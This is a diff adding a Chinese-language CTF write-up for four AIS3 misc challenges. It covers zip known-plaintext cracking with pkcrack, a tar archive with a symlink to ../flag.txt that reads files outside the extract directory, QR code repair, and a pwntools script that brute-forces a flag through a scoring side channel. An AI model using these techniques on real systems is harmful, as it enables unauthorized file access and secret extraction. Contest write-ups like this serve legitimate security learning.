@@ -756,6 +756,241 @@ app.listen(process.env.PORT, '0.0.0.0');
 
 ## Misc
 
+### Karuego
+
+zip 已知明文攻擊
+
+題目是一張圖片，果斷用 `binwalk` 看
+```
+$ binwalk Karuego_0d9f4a9262326e0150272debfd4418aaa600ffe4.png
+
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 2880 x 1492, 8-bit/color RGBA, non-interlaced
+41            0x29            Zlib compressed data, compressed
+2059568       0x1F6D30        Zip archive data, at least v1.0 to extract, name: files/
+2059632       0x1F6D70        Zip archive data, encrypted at least v2.0 to extract, compressed size: 113020, uncompressed size: 113110, name: files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg
+2172779       0x21276B        Zip archive data, encrypted at least v2.0 to extract, compressed size: 1087747, uncompressed size: 1092860, name: files/Demon.png
+3260899       0x31C1E3        End of Zip archive, footer length: 22
+```
+
+一個正常的 png 長這樣，跟上頭比較可以發現上頭的檔案後面多了 zip
+
+```
+DECIMAL       HEXADECIMAL     DESCRIPTION
+--------------------------------------------------------------------------------
+0             0x0             PNG image, 313 x 313, 1-bit colormap, non-interlaced
+72            0x48            Zlib compressed data, best compression
+```
+
+裡頭的 png 可以在 google 找到：
+![](https://i.imgur.com/Nl00idU.png)
+
+把 zip 從 jpg 中拆開：
+
+```
+# 使用 dd
+dd if=./Karuego_0d9f4a9262326e0150272debfd4418aaa600ffe4.png bs=1 count=1201353 skip=2059568 of=plain.zip
+# 使用 binwalk
+binwalk -e ./Karuego_0d9f4a9262326e0150272debfd4418aaa600ffe4.png
+```
+
+把剛剛下載的 `3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg` 放到路徑 `files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg` 並壓縮起來 (`plain.zip`)
+
+```bash
+mkdir files && mv 3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg files
+zip -r plain.zip files
+# adding: files/ (stored 0%)
+# adding: files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg (deflated 0%)
+```
+
+* 使用 pkcrack 進行已知明文攻擊
+```bash
+pkcrack -C ./target.zip -c files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg -P ./plain.zip -p files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg -d ok.zip
+# ...
+# Ta-daaaaa! key0=9237ea20, key1=cf7dddf2, key2=dec3715e
+# Probabilistic test succeeded for 18584 bytes.
+# Stage 2 completed. Starting zipdecrypt on Wed Jun 24 20:59:25 2020
+# Decrypting files/3a66fa5887bcb740438f1fb49f78569cb56e9233_hq.jpg (92bf2f95a9d174734b346f21)... OK!
+# Decrypting files/Demon.png (e2b00708877d5ef45c82e286)... OK!
+# Finished on Wed Jun 24 20:59:25 2020
+```
+
+得到 flag:
+![](https://i.imgur.com/YZiFnNt.jpg)
+
+### Shichirou
+
+這題可以上傳一個檔案，上傳後的檔案會用 `tar` 解開並放在一層目錄下，之後會用 `sha1` 檢驗解壓出來的 `guess.txt` 看有沒有跟 `flag.txt` 一樣
+
+```python
+#!/usr/bin/env python3
+import os
+import sys
+import tempfile
+import subprocess
+import resource
+
+resource.setrlimit(resource.RLIMIT_FSIZE, (65536, 65536))
+os.chdir(os.environ['HOME'])
+
+size = int(sys.stdin.readline().rstrip('\r\n'))
+if size > 65536:
+    print('File is too large.')
+    quit()
+
+data = sys.stdin.read(size)
+with tempfile.NamedTemporaryFile(mode='w+', suffix='.tar', delete=True, dir='.') as tarf:
+    with tempfile.TemporaryDirectory(dir='.') as outdir:
+        tarf.write(data)
+        tarf.flush()
+        try:
+            subprocess.check_output(['/bin/tar', '-xf', tarf.name, '-C', outdir])
+        except:
+            print('Broken tar file.')
+            raise
+
+        try:
+            a = subprocess.check_output(['/usr/bin/sha1sum', 'flag.txt'])
+            b = subprocess.check_output(['/usr/bin/sha1sum', os.path.join(outdir, 'guess.txt')])
+            a = a.split(b' ')[0]
+            b = b.split(b' ')[0]
+            assert len(a) == 40 and len(b) == 40
+            if a != b:
+                raise Exception('sha1')
+        except:
+            print('Different.')
+            raise
+
+        print(open('flag.txt', 'r').readline())
+```
+
+想法：`sha1sum` 可以接 symlink 的檔案，所以可以讓 `guess.txt` 指向上一層的 `flag.txt`
+
+```bash
+$ ls -al
+lrwxr-xr-x 1 roy4801   11 Jun  8 00:55 guess.txt -> ../flag.txt
+...
+$ sha1sum guess.txt
+1d229271928d3f9e2bb0375bd6ce5db6c6d348d9  guess.txt
+$ sha1sum ../flag.txt
+1d229271928d3f9e2bb0375bd6ce5db6c6d348d9  ../flag.txt
+```
+
+然後把 `guess.txt` 用 `tar` 包起來就好
+
+```python
+#!/usr/bin/env python3
+# -*- coding: UTF-8 -*-
+from pwn import *
+import time
+
+host = '60.250.197.227'
+port = 11000
+r = remote(host,port)
+
+with open('test.tar', 'rb') as f:
+    d = f.read()
+
+r.sendline(str(len(d)))
+time.sleep(1)
+r.sendline(d)
+r.interactive()
+# AIS3{Bu223r!!!!_I_c4n_s33_e_v_e_r_y_th1ng!!}
+```
+
+### Soy
+
+![](https://i.imgur.com/VemYvKF.png)
+
+這題就給一個有損壞的 QR Code，用[工具](https://merricx.github.io/qrazybox/)還原
+
+* 這邊有幾篇不錯的資源
+    * http://www.datagenetics.com/blog/november12013/
+    * https://stackoverflow.com/questions/13329406/analyze-partial-or-corrupted-qr-codes
+    * https://blog.xiafeng2333.top/ctf-13/
+
+### Saburo
+
+這題是給你一個伺服器位置，連上去後會叫你輸入 flag 的字元，如果字元正確的話數字會比較大，錯誤則會比較小，且數字會浮動，所以要寫腳本
+
+```python
+#!/usr/bin/env python3
+# -*- coding: UTF-8 -*-
+from pwn import *
+from multiprocessing import Pool
+import string
+import re
+import pprint
+import heapq
+
+pp = pprint.PrettyPrinter(indent=4)
+
+host = '60.250.197.227'
+port = 11001
+flag = 'AIS3{A1r1ght_U_4r3_my_'
+# 這個方法不穩定，有時候後面會壞掉，就從已經知道的 flag 前綴開始重跑腳本
+
+char_set = string.ascii_letters+string.digits+string.punctuation
+def check():
+    for i in char_set:
+        r = remote(host, port)
+        try:
+            r.recvuntil(': ')
+            r.sendline(flag + i)
+            l = r.recvline()
+            if i not in dic:
+                dic[i] = int(l.split()[4])
+            else:
+                dic[i] += int(l.split()[4])
+        except:
+            pass
+        r.close()
+
+first_same = 0
+prev_first = None
+while True:
+    dic = {}
+    firx = None
+    firy = 0
+    secx = None
+    secy = 0
+
+    while True:
+        print('.', end='')
+        check()
+        # find
+        for x, y in dic.items():
+            if y > firy:
+                secx = firx
+                secy = firy
+                firy = y
+                firx = x
+            else:
+                if y > secy:
+                    secy = y
+                    secx = x
+        print('{} {}; {} {}'.format(secx, secy, firx, firy))
+        #
+        if prev_first == firx:
+            first_same += 1
+        prev_first = firx
+        #
+        if firy - secy >= 50 or first_same >= 10:
+            first_same = 0
+            prev_first = None
+            break
+
+    # print(mx, my)
+    flag += firx
+    # info(flag)
+    print('>> {}'.format(flag))
+```
+
+* p.s.
+    * pwntools 的腳本用指令列執行加上 `SILENT=1` 可以關掉 logger
+        * e.g. `./exp.py SILENT=1`
+
 ## Crypto
 
 ### Brontosaurus
@@ -824,5 +1059,3 @@ dec = int(key[:400], 2) ^ 211460526181534071242465941322564750731787295294236649
 print('{:b}'.format(dec))
 print(int2bytes(dec))
 ```
-
-
